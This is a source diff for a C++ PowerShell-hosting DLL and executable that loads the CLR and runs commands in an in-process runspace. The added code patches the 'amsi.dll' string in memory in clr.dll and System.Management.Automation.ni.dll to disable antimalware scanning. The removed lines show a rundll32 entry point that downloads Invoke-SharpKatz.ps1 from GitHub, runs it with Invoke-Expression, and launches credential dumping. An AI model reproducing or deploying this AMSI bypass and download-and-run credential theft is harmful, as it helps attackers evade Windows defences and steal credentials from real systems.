@@ -40,11 +40,11 @@ static void PSH_SetLastError(const std::wstring& msg) {
     g_lastError = msg;
 }
 
-extern "C" __declspec(dllexport) int PSH_Initialize() {
+extern "C" __declspec(dllexport) BOOL PS_Init() {
     std::lock_guard<std::mutex> lock(g_mutex);
 
     if (g_clr != nullptr) {
-        return PSH_OK;
+        return TRUE;
     }
 
     g_clr = new CLR();
@@ -52,7 +52,20 @@ extern "C" __declspec(dllexport) int PSH_Initialize() {
         PSH_SetLastError(L"Failed to init CLR");
         delete g_clr;
         g_clr = nullptr;
-        return PSH_ERR_INIT;
+        return FALSE;
+    }
+
+    PVOID lpClrAddr = GetModuleHandleA("clr.dll");
+    if (!lpClrAddr) {
+        PRINT_ERROR("GetModuleHandleA");
+        return 0;
+    }
+
+    wchar_t patchAmsi = L'H';
+    LPVOID addrAmsi = (LPVOID)FindFirstStringW((uintptr_t)lpClrAddr, 0x9A0000, L"amsi.dll");
+    if (addrAmsi) {
+        DEBUG("Patch string amsi dll");
+        PatchProcedure(addrAmsi, (BYTE*)&patchAmsi, sizeof(char));
     }
 
     g_ctx = new RunspaceContext();
@@ -63,32 +76,60 @@ extern "C" __declspec(dllexport) int PSH_Initialize() {
         g_clr->FreeCLR();
         delete g_clr;
         g_clr = nullptr;
-        return PSH_ERR_RUNSPACE;
+        return FALSE;
     }
 
     Patch(*g_clr);
 
-    return PSH_OK;
+    PVOID lpAutoAddr = GetModuleHandleA("System.Management.Automation.ni.dll");
+    if (!lpAutoAddr) {
+        PRINT_ERROR("GetModuleHandleA");
+        return 0;
+    }
+
+    while (true)
+    {
+        char patchAmsi = 'H';
+
+        LPVOID addrAmsi = (LPVOID)FindFirstString(
+            (uintptr_t)lpAutoAddr,
+            0x1FF0000,
+            "amsi.dll"
+        );
+
+        if (!addrAmsi)
+            break;
+
+        PatchProcedure(
+            addrAmsi,
+            (BYTE*)&patchAmsi,
+            sizeof(patchAmsi)
+        );
+    }
+
+    return TRUE;
 }
 
-extern "C" __declspec(dllexport) int PSH_Execute(const wchar_t* command, wchar_t* outBuf, int outSize) {
+extern "C" __declspec(dllexport) BOOL PS_IsInitialized() {
+    std::lock_guard<std::mutex> lock(g_mutex);
+    return (g_clr != nullptr && g_ctx != nullptr) ? TRUE : FALSE;
+}
+
+extern "C" __declspec(dllexport) BSTR PS_Execute(LPCWSTR command) {
     std::lock_guard<std::mutex> lock(g_mutex);
 
     if (g_clr == nullptr || g_ctx == nullptr) {
-        PSH_SetLastError(L"PSH_Execute called before PSH_Initialize");
-        return PSH_ERR_NOT_INIT;
+        PSH_SetLastError(L"PS_Execute called before PS_Init");
+        return SysAllocString(L"[!] not initialized - call PS_Init first");
     }
 
-    if (command == nullptr || outBuf == nullptr || outSize <= 0) {
-        PSH_SetLastError(L"Invalid argument");
-        return PSH_ERR_INVALID;
+    if (command == nullptr) {
+        return SysAllocString(L"");
     }
-
-    outBuf[0] = L'\0';
 
     std::wstring cmd(command);
     if (cmd == L"exit" || cmd == L"quit") {
-        return PSH_OK;
+        return SysAllocString(L"");
     }
 
     std::wstring out;
@@ -96,17 +137,10 @@ extern "C" __declspec(dllexport) int PSH_Execute(const wchar_t* command, wchar_t
         PSH_SetLastError(L"InvokeInRunspace failed");
     }
 
-    int needed = (int)out.size();
-    int toCopy = (needed < outSize - 1) ? needed : (outSize - 1);
-    if (toCopy > 0) {
-        wcsncpy_s(outBuf, outSize, out.c_str(), toCopy);
-    }
-    outBuf[toCopy] = L'\0';
-
-    return PSH_OK;
+    return SysAllocString(out.c_str());
 }
 
-extern "C" __declspec(dllexport) void PSH_Cleanup() {
+extern "C" __declspec(dllexport) void PS_Shutdown() {
     std::lock_guard<std::mutex> lock(g_mutex);
 
     if (g_ctx != nullptr) {
@@ -124,39 +158,10 @@ extern "C" __declspec(dllexport) void PSH_Cleanup() {
     g_lastError.clear();
 }
 
-extern "C" __declspec(dllexport) const wchar_t* PSH_GetLastError() {
+extern "C" __declspec(dllexport) const wchar_t* PS_GetLastError() {
     return g_lastError.c_str();
 }
 
-// Entry: full init + invoke + show output in MessageBox
-// Usage: rundll32 PowershellHosting.dll,Init
-extern "C" __declspec(dllexport) void CALLBACK Init() {
-    //const wchar_t* cmd = L"[System.Net.Dns]::GetHostAddresses('google.com')";
-    const wchar_t* cmd = L"Invoke-RestMethod -Uri \"https://github.com/S3cur3Th1sSh1t/PowerSharpPack/raw/refs/heads/master/PowerSharpBinaries/Invoke-SharpKatz.ps1\" -UseBasicParsing | Invoke-Expression; Invoke-SharpKatz";
-
-    // 1) Init (CLR + Runspace + Patch)
-    int rc = PSH_Initialize();
-    if (rc != PSH_OK) {
-        std::string err;
-        int n = WideCharToMultiByte(CP_ACP, 0, g_lastError.c_str(), -1, NULL, 0, NULL, NULL);
-        if (n > 0) {
-            err.resize(n - 1);
-            WideCharToMultiByte(CP_ACP, 0, g_lastError.c_str(), -1, &err[0], n, NULL, NULL);
-        }
-        MessageBoxA(NULL, err.c_str(), "PSH_Initialize failedx", MB_ICONERROR);
-        return;
-    }
-
-    // 2) Invoke
-    std::wstring out;
-    if (!InvokeInRunspace(*g_clr, g_ctx, std::wstring(cmd), &out)) {
-        PSH_SetLastError(L"InvokeInRunspace failed");
-    }
-
-    // 3) Show output in MessageBox (truncate to 4000 wide-chars to fit)
-    std::wstring preview = out.size() > 4000 ? out.substr(0, 4000) + L"\n[...truncated]" : out;
-    MessageBoxW(NULL, preview.c_str(), L"PSH output", MB_ICONINFORMATION);
-}
 
 
 #else
@@ -182,7 +187,6 @@ int main() {
 	}
 
 
-    //getchar();
     PVOID lpClrAddr = GetModuleHandleA("clr.dll");
     if (!lpClrAddr) {
         PRINT_ERROR("GetModuleHandleA");
@@ -196,16 +200,6 @@ int main() {
         PatchProcedure(addrAmsi, (BYTE*)&patchAmsi, sizeof(char));
     }
 
-    //const char* patch = "AmsiScanString";
-    //LPVOID addr = (LPVOID)FindFirstString((uintptr_t)lpClrAddr, 0x9A0000, "AmsiInitialize");
-    //if (addr) {
-    //    DEBUG("Patch string AmsiInitialize");
-    //    std::cout << "Patch string AmsiInitialize" << addr << std::endl;
-    //    PatchProcedure(addr, (BYTE*)patch, strlen(patch));
-    //}
-
-
-    // 
 	// Initialize runspace ONCE at startup
 	RunspaceContext ctx;
 	if (!InitRunspace(clr, &ctx)) {
@@ -213,6 +207,34 @@ int main() {
 		return 0;
 	}
 
+    PVOID lpAutoAddr = GetModuleHandleA("System.Management.Automation.ni.dll");
+    if (!lpAutoAddr) {
+        PRINT_ERROR("GetModuleHandleA");
+        return 0;
+    }
+
+    while (true)
+    {
+        char patchAmsi = 'H';
+
+        LPVOID addrAmsi = (LPVOID)FindFirstString(
+            (uintptr_t)lpAutoAddr,
+            0x1FF0000,
+            "amsi.dll"
+        );
+
+        if (!addrAmsi)
+            break;
+
+        DEBUG("Found string amsi.dll");
+        printf("%p\n", addrAmsi);
+
+        PatchProcedure(
+            addrAmsi,
+            (BYTE*)&patchAmsi,
+            sizeof(patchAmsi)
+        );
+    }
     //PatchEtw();
 	// Interactive loop - runspace stays open
 	while (1) {
